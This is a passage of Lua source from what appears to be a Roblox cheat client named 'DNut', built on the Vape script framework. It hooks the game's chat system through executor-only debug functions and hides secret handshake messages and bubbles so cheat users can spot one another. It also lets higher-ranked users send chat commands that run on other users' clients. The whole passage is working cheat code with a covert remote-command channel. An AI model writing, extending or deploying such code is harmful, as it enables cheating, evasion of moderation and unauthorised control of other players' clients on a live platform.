				repstorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Functions.IsSpecialIngame().Name.." "..clients.ChatStrings2.dnut, "All")
			end									
		end
	end
end)

local entity = shared.vapeentity
if not entity then
	repeat task.wait()
		entity = shared.vapeentity
	until entity
end
local tab = {}

lplr.PlayerGui:WaitForChild("Chat").Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller.ChildAdded:Connect(function(text)
	local textlabel2 = text:WaitForChild("TextLabel")
	if Functions.IsSpecialIngame() ~= "DEFAULT" then
		local args = textlabel2.Text:split(" ")
		local client = clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
		if textlabel2.Text:find("You are now chatting") or textlabel2.Text:find("You are now privately chatting") then
			text.Size = UDim2.new(0, 0, 0, 0)
			text:GetPropertyChangedSignal("Size"):Connect(function()
				text.Size = UDim2.new(0, 0, 0, 0)
			end)
		end
		if client then
			if textlabel2.Text:find(clients.ChatStrings2[client]) then
				text.Size = UDim2.new(0, 0, 0, 0)
				text:GetPropertyChangedSignal("Size"):Connect(function()
					text.Size = UDim2.new(0, 0, 0, 0)
				end)
			end
		end
		textlabel2:GetPropertyChangedSignal("Text"):Connect(function()
			local args = textlabel2.Text:split(" ")
			local client = clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
			if textlabel2.Text:find("You are now chatting") or textlabel2.Text:find("You are now privately chatting") then
				text.Size = UDim2.new(0, 0, 0, 0)
				text:GetPropertyChangedSignal("Size"):Connect(function()
					text.Size = UDim2.new(0, 0, 0, 0)
				end)
			end
			if client then
				if textlabel2.Text:find(clients.ChatStrings2[client]) then
					text.Size = UDim2.new(0, 0, 0, 0)
					text:GetPropertyChangedSignal("Size"):Connect(function()
						text.Size = UDim2.new(0, 0, 0, 0)
					end)
				end
			end
		end)
	end
end)		

for i, v in pairs(getconnections(game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
    if v.Function
        and #debug.getupvalues(v.Function) > 0
        and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
        oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
        oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
        getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
            local tab = oldchannelfunc(Self, Name)
            if tab and tab.AddMessageToChannel then
                local addmessage = tab.AddMessageToChannel
                if oldchanneltabs[tab] == nil then
                    oldchanneltabs[tab] = tab.AddMessageToChannel
                end
                tab.AddMessageToChannel = function(Self2, MessageData)
                    if MessageData.FromSpeaker and game.Players[MessageData.FromSpeaker] then
                        if Functions.CheckPlayerType(game.Players[MessageData.FromSpeaker]) ~= "DEFAULT" then
							local role,color = Functions.CheckPlayerType(game.Players[MessageData.FromSpeaker])
                            MessageData.ExtraData = {
                                NameColor =  game.Players[MessageData.FromSpeaker].Team == nil and Color3.new(135,206,235)
                                    or game.Players[MessageData.FromSpeaker].TeamColor.Color,
                                Tags = {
                                    table.unpack(MessageData.ExtraData.Tags),
                                    {
                                        TagColor = color,
                                        TagText = role,
                                    },
                                },
                            }
                        end
                    end
                    return addmessage(Self2, MessageData)
                end
            end
            return tab
        end
    end
end
local a = false
task.spawn(function()
	game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
	a = true;
end)
task.spawn(function()
	task.wait(2)
	a = true;
end)
repeat task.wait() until a
task.wait(0.2)
if getconnections then
	for i,v in pairs(getconnections(game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
		if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
			task.wait(.15)
			debug.getupvalues(v.Function)[1]:SwitchCurrentChannel("All")
		end
	end
end

local alreadysaidlist = {}

local function findplayers(arg, plr)
	local temp = {}
	local continuechecking = true

	if arg == "default" and continuechecking and Functions.CheckPlayerType(lplr) == "DNut User" then table.insert(temp, lplr) continuechecking = false end
	if arg == "teamdefault" and continuechecking and Functions.CheckPlayerType(lplr) == "DNut User" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
	if arg == "private" and continuechecking and Functions.CheckPlayerType(lplr) == "DNut Private" then table.insert(temp, lplr) continuechecking = false end
	--if arg == "developer" and continuechecking and Functions.CheckPlayerType(lplr) == "DNut Developer" then table.insert(temp, lplr) continuechecking = false end
	for i,v in pairs(game:GetService("Players"):GetChildren()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end

	return temp
end

chatconnection = repstorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
	local do_;
	if tab.MessageType ~= "Whisper" then do_ = false  end
	local plr = game.Players:FindFirstChild(tab["FromSpeaker"])
	local args = tab.Message:split(" ")
	local client = clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
	task.wait()
	if do_ == nil then
	task.wait()
		if plr and Functions.CheckPlayerType(lplr) ~= "DEFAULT" and tab.MessageType == "Whisper" and client ~= nil and alreadysaidlist[plr.Name] == nil and do_ == nil then
			alreadysaidlist[plr.Name] = true
			local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
			if playerlist then
				pcall(function()
					local playerlistplayers = playerlist.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
					local targetedplr = playerlistplayers:FindFirstChild("p_"..plr.UserId)
					if targetedplr then 
						targetedplr.ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerIcon.Image = getcustomassetfunc("vape/assets/VapeIcon.png")
					end
				end)
			end
			task.spawn(function()
				local connection
				for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
					if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat task.wait() until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end
				connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
					if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat task.wait() until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end)
			end)
			createwarning("DNut", plr.Name.." is using "..client.."!", 60)
			clients.ClientUsers[plr.Name] = client:upper()..' USER'
			local ind, newent = entity.getEntityFromPlayer(plr)
			if newent then entity.entityUpdatedEvent:Fire(newent) end
		end
	end
	if (priolist[string.upper(Functions.CheckPlayerType(lplr))] or 0) > 0 and plr == lplr then
		if tab.Message:len() >= 5 and tab.Message:sub(1, 5):lower() == ";cmds" then
			local tab = {}
			for i,v in pairs(commands) do
				table.insert(tab, i)
			end
			table.sort(tab)
			local str = ""
			for i,v in pairs(tab) do
				str = str..";"..v.."\n"
			end
			game.StarterGui:SetCore("ChatMakeSystemMessage",{
				Text = 	str,
			})
		end
	end
	if plr and (priolist[Functions.CheckPlayerType(plr)] or 0) > 0 and plr ~= lplr and priolist[Functions.CheckPlayerType(plr)] > priolist[Functions.CheckPlayerType(lplr)] and #args > 1 then
		table.remove(args, 1)
		local chosenplayers = findplayers(args[1], plr)
		if table.find(chosenplayers, lplr) then
			table.remove(args, 1)
			for i,v in pairs(commands) do
				if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
					v(args, plr)
					break
				end
			end
		end
	end
end)

local text = (shared.DNutPrivateLoaded and "DNut Private" or "DNut")
local version = "1.17b (added VelocityFly and HighVeloJump(high velocity jump) )"
GuiLibrary["MainGui"].ScaledGui.ClickGui.Version.Text = text.." | v"..version
GuiLibrary["MainGui"].ScaledGui.ClickGui.MainWindow.TextLabel.Text = text.." | v"..version
GuiLibrary["MainGui"].ScaledGui.ClickGui.Version.Version.Text = text.." | v"..version
GuiLibrary["MainGui"].ScaledGui.ClickGui.Version.Position = UDim2.new(1, -175 - 20, 1, -25)
createwarning("DNut","DNut Loaded.",5)
